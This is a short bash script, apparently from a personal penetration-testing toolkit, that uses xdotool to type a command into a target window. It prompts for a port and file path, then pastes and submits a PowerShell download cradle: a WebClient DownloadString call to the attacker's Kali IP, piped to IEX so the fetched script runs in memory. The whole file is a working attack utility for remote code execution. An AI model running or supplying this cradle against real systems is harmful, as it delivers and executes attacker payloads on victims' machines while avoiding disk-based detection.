#!/bin/bash

: '
PowerShell: Download and execute script in memory.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Port" "Path"

PORT=${form_data["Port"]}
B_PATH=${form_data["Path"]}
F_NAME=$(basename $B_PATH)

paste_command "(new-object system.net.webclient).downloadstring('http://${KALI_IP}:${PORT}/${B_PATH}') | IEX; "
xdotool key Return